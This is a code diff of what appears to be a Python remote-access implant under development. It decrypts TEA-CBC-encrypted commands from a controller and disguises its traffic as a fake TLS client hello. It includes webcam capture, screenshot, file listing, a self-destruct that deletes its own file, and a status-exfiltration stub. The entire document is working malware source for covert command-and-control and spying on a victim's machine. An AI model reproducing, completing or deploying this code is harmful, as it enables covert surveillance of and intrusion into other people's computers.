@@ -1,51 +1,41 @@
 import random
 import subprocess
+from ctypes import c_uint
 from socket import *
 
 import cv2
 import pyautogui
 
+ip = "localhost"
+port = 2048 # change back to 443 after testing
+
 K = [0x77652061, 0x72652072, 0x3373652d, 0x72636821] # TEA key
 magic = 0x9e3779b9
 
 def decrypt(ciphertext: list[int]) -> list[int]:
-    L = ciphertext[0]
-    R = ciphertext[1]
-    sum = magic << 5
+    L = c_uint(ciphertext[0])
+    R = c_uint(ciphertext[1])
+    sum = c_uint(magic)
+    sum.value <<= 5
     for x in range(0,32):
-        R -= ((L << 4) + K[2]) ^ (L + sum) ^ ((L >> 5) + K[3])
-        L -= ((R << 4) + K[0]) ^ (R + sum) ^ ((R >> 5) + K[1])
-        sum -= magic
-    return [L, R]
-
-def arrtoint(ints: list[int]) -> int:
-    hexs = [hex(int)[2:].rjust(2,"0") for int in ints]
-    hexn = "".join(hexs)
-    return int(hexn, 16)
-
-def matrxor(matr1: list[int], matr2: list[int]) -> list[int]:
-    out = []
-    for x in range(0,2):
-        out.append(matr1[x] ^ matr2[x])
-    return out
+        R.value -= ((L.value << 4) + K[2]) ^ (L.value + sum.value) ^ ((L.value >> 5) + K[3])
+        L.value -= ((R.value << 4) + K[0]) ^ (R.value + sum.value) ^ ((R.value >> 5) + K[1])
+        sum.value -= magic
+    return [L.value, R.value]
 
 def fromint(ints: list[int]) -> str:
-    L = ""
-    R = ""
-    for x in range(0,4):
-        L = chr(ints[0] // pow(256,x)) + L
-        R = chr(ints[1] // pow(256,x)) + R
-    return L + R
+    Lbytes = ints[0].to_bytes(4, 'big')
+    Rbytes = ints[1].to_bytes(4, 'big')
+    return Lbytes.decode() + Rbytes.decode()
 
 def cbc(ciphertext: bytes) -> str:
     plain = []
-    arr = list(ciphertext)
-    blockarr = []
+    blocks = []
     for x in range(0,9):
-        blockarr.append([arrtoint(arr[4*x:4*x+4]), arrtoint(arr[4*x+4:4*x+8])])
+        blocks.append([int.from_bytes(ciphertext[8*x:8*x+4], 'big'), int.from_bytes(ciphertext[8*x+4:8*x+8], 'big')])
     for x in range(1,9):
-        prexor = decrypt(blockarr[x])
-        plain.append(matrxor(prexor, blockarr[x-1]))
+        prexor = decrypt(blocks[x])
+        plain.append([prexor[0] ^ blocks[x-1][0], prexor[1] ^ blocks[x-1][1]])
     out = ""
     for x in range(0,8):
         out += fromint(plain[x])
@@ -53,7 +43,7 @@ def cbc(ciphertext: bytes) -> str:
 
 def parsecmd(enccmd: bytes):
     cmd = cbc(enccmd)
-    cmdarr = cmd.split("|")
+    cmdarr = cmd.split(":")
     ct = cmdarr[0] # command type
     if len(cmdarr) > 1:
         cp = cmdarr[1] # command parameter
@@ -77,9 +67,9 @@ def execcmd(cmd):
     elif ct == "sd": # self destruct
         sd()
     elif ct == "stat": # exfiltrate status
-        exfil("1")
-    else:
-        exfil("0")
+        exfil(bytes([1]))
+    else: # exfiltrate failure status
+        exfil(bytes([0]))
 
 def ls(cp):
     if cp == "":
@@ -109,19 +99,8 @@ def cam():
 def sd():
     subprocess.run(["rm", __file__])
 
-def exfil(info): # TODO
-    print("exfil something")
-
-# FakeTLS code based on https://medium.com/@raykaryshyn/an-implementation-of-faketls-85b94f496d72
-
-ip = "1"
-port = 443
-
-def makerandbytes(length: int) -> list[int]:
-    out = []
-    for x in range(0,length):
-        out.append(random.randint(0,255))
-    return out
+def exfil(info: bytes): # TODO
+    print(info)
 
 def makehello() -> list[int]:
     servernames = [
@@ -134,20 +113,20 @@ def makehello() -> list[int]:
         "www.wikipedia.com", "www.wordpress.com"
     ]
     random.seed()
-    servname = servernames[random.randint(0,14)].encode()
+    servname = servernames[random.randint(0,13)].encode()
     servname_s = len(servname)
 
-    extserv_pre = [
+    extserv_pre = bytes([
         0x00, 0x00,
         0x00, servname_s + 5,
         0x00, servname_s + 3,
         0x00, 0x00,
         servname_s
-    ]
+    ])
 
     extserv = extserv_pre + servname
 
-    extoth_p1 = [
+    extoth_p1 = bytes([
         0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a,
         0x00, 0x16, 0x00, 0x14, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x1e,
         0x00, 0x19, 0x00, 0x18, 0x01, 0x00, 0x01, 0x01, 0x01, 0x02,
@@ -158,58 +137,51 @@ def makehello() -> list[int]:
         0x08, 0x05, 0x08, 0x06, 0x04, 0x01, 0x05, 0x01, 0x06, 0x01,
         0x00, 0x2b, 0x00, 0x03, 0x02, 0x03, 0x04, 0x00, 0x2d, 0x00,
         0x02, 0x01, 0x01, 0x00, 0x33, 0x00, 0x26, 0x00, 0x24, 0x00,
-        0x1d, 0x00, 0x20, 0x35, 0x80, 0x72, 0xd6, 0x36, 0x58, 0x80,
-        0xd1, 0xae, 0xea, 0x32, 0x9a, 0xdf, 0x91, 0x21, 0x38, 0x38,
-        0x51, 0xed, 0x21, 0xa2, 0x8e, 0x3b, 0x75, 0xe9, 0x65, 0xd0,
-        0xd2, 0xcd, 0x16, 0x62, 0x54
-    ]
-    extoth_p2 = makerandbytes(32)
+        0x1d, 0x00, 0x20
+    ])
+    extoth_p2 = random.randbytes(32)
     extoth = extoth_p1 + extoth_p2
 
     ext = extserv + extoth
 
-    cvel_r1 = makerandbytes(32)
-    cvel_r2 = makerandbytes(32)
+    cvel_r1 = random.randbytes(32)
+    cvel_r2 = random.randbytes(32)
     
-    cvel_p1 = [
-        0x03, 0x03
-    ]
-    cvel_p2 = [
-        0x20
-    ]
-    cvel_p3 = [
+    cvel_p1 = bytes([0x03, 0x03])
+    cvel_p2 = bytes([0x20])
+    cvel_p3 = bytes([
         0x00, 0x08, 0x13, 0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff,
         0x01, 0x00, 0x00, len(ext)
-    ]
+    ])
     cvel = cvel_p1 + cvel_r1 + cvel_p2 + cvel_r2 + cvel_p3
 
     cvrest = cvel + ext
     cvrest_s = len(cvrest)
 
-    top = [
+    top = bytes([
         0x16, 0x03,
         0x01, 0x00,
         cvrest_s + 4, 0x01,
         0x00, 0x00,
         cvrest_s
-    ]
+    ])
 
     clihel = top + cvrest
     return clihel
 
 def sendhello(clientSocket):
     clihel = makehello()
-    clientSocket.send(bytes(clihel))
+    clientSocket.send(clihel)
 
 def sendhellofin(clientSocket):
-    clihelfin_p1 = [
+    clihelfin_p1 = bytes([
         0x14, 0x03, 0x03, 0x00, 0x01, 0x01, 0x17, 0x03, 0x03, 0x00,
         0x45
-    ]
-    clihelfin_p2 = makerandbytes(69)
+    ])
+    clihelfin_p2 = random.randbytes(69)
     clihelfin = clihelfin_p1 + clihelfin_p2
 
-    clientSocket.send(bytes(clihelfin))
+    clientSocket.send(clihelfin)
 
 def main():
     clientSocket = socket(AF_INET, SOCK_STREAM)
